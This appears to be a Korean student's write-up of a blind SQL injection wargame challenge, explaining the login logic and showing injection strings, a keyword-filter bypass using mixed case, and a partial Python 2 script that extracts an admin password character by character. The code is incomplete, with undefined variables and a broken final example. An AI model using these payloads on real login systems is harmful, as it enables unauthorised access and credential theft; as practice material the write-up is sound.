# 문제

- Blind SQL Injection

- 아이디와 패스워드 값을 입력받는다.

- 일치하면 로그인 성공이 뜨고, 아니면 로그인 실패를 출력해준다.

  

# 풀이

- 블라인드 SQL 인젝션을 정식으로(?) 처음 하므로, 풀이보다는 분석 및 이해글이 되겠다.

- 특이점

  ##### Wrong password

  - id에 `guest' or 1=1 -- `, password에 아무거나 입력하면

    wrong password가 출력된다.

  - 그런데 sql 쿼리가 아닌, id에 `guest` password에 아무거나 입력하면

    그냥 login failed가 뜬다.

    - 왜 이때는 wrong password가 안뜨는거지? 똑같이 패스워드만 틀린건데

  - 정답!

    - 서버에서는 이렇게 구성되있는것이다.
    - 입력받은 id와 password를 DB를 조회,
    - 조회한 뒤, 가져온 값과 입력값 비교
      - 조회에 실패하면, login failed
      - 조회에 성공했는데, 입력값과 일치하지 않으면 Wrong password
      - 일치하면 login successful

- 대충 이해했으므로 풀어보자

- admin의 패스워드 값을 찾아야 할 것 같다.

- length로 길이를 확인해보자

  - `admin' and length(pw)=36 --` 

- substr로 패스워드값을 하나씩 확인해보자

  - id값 입력
    - `admin' and substr(pw, 1,1)='a' -- `

- 코딩을 해보자

  ```python
      len_flag = 36
      pw = 'guest'
      keys = 'abcdefghijklnmopqrstuvwxyz1234567890ABCDEFGHIJKLNMOPQRSTUVWXYZ!@#$%^&*()_+=-{}'
      while idx <= 36:
          for cur in keys:
              id = 'admin\' and substr(pw,{0},1)=\'{1}\' -- '.format(idx, cur)
              print 'id: ' + id
              getParam = '?id={0}&pw={1}'.format(id, pw)
              res = requests.get('http://www.webhacking.kr/'+page+getParam, cookies = cookies)
              if res.text.find('wrong password')!= -1:
                  flag+=cur
                  print 'found!!!'
                  print 'current: ' + cur
                  print 'corrected flags: ' + flag
                  f.write(flag+':'+str(idx)+'\n')
                  break
          idx += 1
      print 'found the flag successfully...'
      print 'flag: ' + flag
  ```

  



# 알게된 것

### Select 키워드 우회

- php에서는 대소문자를 구별하지만, sql에서는 구별하지 않으므로
  - seLeCt와 같이 우회할 수 있다.



### substr

- sql의 내장함수

- substr()글자를 쪼개서 반환할 수 있다.

- substr('abcd', 1, 1), return 'a'

- `or substr(select pw from table where id='admin', 1, 1)='a'` 의 형태로 특정 컬럼값을 확인할 수 있다.

- 테이블 속성값을 지정할 수 있다.

  - 위 문제에서 `admin' and substr(pw, 1,1)='a'`의 형태로 질의할 경우

    - 앞의 select * from table where id = 'admin' 의 결과값(admin의 정보)에서 pw 속성에 해당하는 값을 비교하게 된다.

### isFile

- 파일 존재유무 판단 함수 in python

- 예시

  ```python
  import os
  
  if os.path.isFile('flag'):
  	print 'yes'
  else:
  	
  ```

  